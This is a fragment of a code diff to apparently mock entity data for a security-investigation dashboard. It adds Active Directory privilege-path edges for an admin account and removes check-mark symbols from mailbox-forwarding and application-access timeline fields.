+              { from:'admin', rel:'OWNS', to:'svc-backup' },
+              { from:'svc-backup', rel:'WRITE_DACL', to:'svc-monitor' }
+            ] }
+          ],
+          // Asset exposure — very few principals can reach a Tier 0 account.
+          incoming: [
+            { source:'Enterprise Admins', hops:[
+              { from:'Enterprise Admins', rel:'GENERIC_ALL', to:'admin' }
+            ] }
+          ]
+        }
+      },
       mailboxForwarding: {
         label: 'Mailbox Forwarding Rules', expanded: false,
         kv: {
@@ -2148,16 +2365,16 @@ const ENTITIES = {
           'Inbox Rules':'1 rule — Move ServiceNow notifications to "Tickets" folder',
           'Delegate Access':'None',
           'Last Rule Change':'12 Feb 2026',
-          'External Forwarding':'Disabled (policy enforced) ✓'
+          'External Forwarding':'Disabled (policy enforced)'
         }
       },
       recentAppAccess: {
         label: 'Application & Portal Access', expanded: false,
         timeline: [
-          { time:'11 May 2026  10:15:00', dot:'green', details: { 'Application':'Azure Portal', 'App ID':'c44b4083-3bb0-49c1-b47d-974e53cbdf3c', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant ✓)', 'Status':'Success', 'MFA':'Hardware token' } },
-          { time:'11 May 2026  10:16:30', dot:'green', details: { 'Application':'Exchange Admin Center', 'App ID':'00000002-0000-0ff1-ce00-000000000000', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant ✓)', 'Status':'Success', 'MFA':'Cached session' } },
-          { time:'10 May 2026  16:45:00', dot:'green', details: { 'Application':'Microsoft 365 Admin Center', 'App ID':'00000006-0000-0ff1-ce00-000000000000', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant ✓)', 'Status':'Success', 'MFA':'Hardware token' } },
-          { time:'09 May 2026  21:15:00', dot:'orange', details: { 'Application':'Azure Portal', 'App ID':'c44b4083-3bb0-49c1-b47d-974e53cbdf3c', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant ✓)', 'Status':'Success — Off-Hours', 'MFA':'Hardware token', 'Note':'Emergency maintenance (confirmed)' } }
+          { time:'11 May 2026  10:15:00', dot:'green', details: { 'Application':'Azure Portal', 'App ID':'c44b4083-3bb0-49c1-b47d-974e53cbdf3c', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant)', 'Status':'Success', 'MFA':'Hardware token' } },
+          { time:'11 May 2026  10:16:30', dot:'green', details: { 'Application':'Exchange Admin Center', 'App ID':'00000002-0000-0ff1-ce00-000000000000', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant)', 'Status':'Success', 'MFA':'Cached session' } },
+          { time:'10 May 2026  16:45:00', dot:'green', details: { 'Application':'Microsoft 365 Admin Center', 'App ID':'00000006-0000-0ff1-ce00-000000000000', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant)', 'Status':'Success', 'MFA':'Hardware token' } },
+          { time:'09 May 2026  21:15:00', dot:'orange', details: { 'Application':'Azure Portal', 'App ID':'c44b4083-3bb0-49c1-b47d-974e53cbdf3c', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant)', 'Status':'Success — Off-Hours', 'MFA':'Hardware token', 'Note':'Emergency maintenance (confirmed)' } }
         ]
       },
       privilegedRoleChanges: {
